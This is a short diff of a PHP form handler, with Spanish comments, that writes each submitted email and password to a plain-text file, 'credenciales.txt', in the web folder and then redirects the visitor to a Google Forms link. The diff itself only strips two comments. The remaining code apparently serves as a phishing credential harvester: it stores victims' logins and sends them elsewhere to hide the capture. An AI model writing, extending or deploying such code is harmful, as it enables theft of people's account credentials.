@@ -10,7 +10,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         exit();
     }
 
-    // Guarda el archivo de texto en la misma carpeta del hosting
     $credentials = sprintf("%s,%s\n", $email, $password);
     $filePath = __DIR__ . '/credenciales.txt';
     $saved = file_put_contents($filePath, $credentials, FILE_APPEND | LOCK_EX);
@@ -20,7 +19,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         exit();
     }
 
-    // Redirección final automática
     header("Location: https://forms.gle/qX13QMHbrFvLBL1E6");
     exit();
 } else {
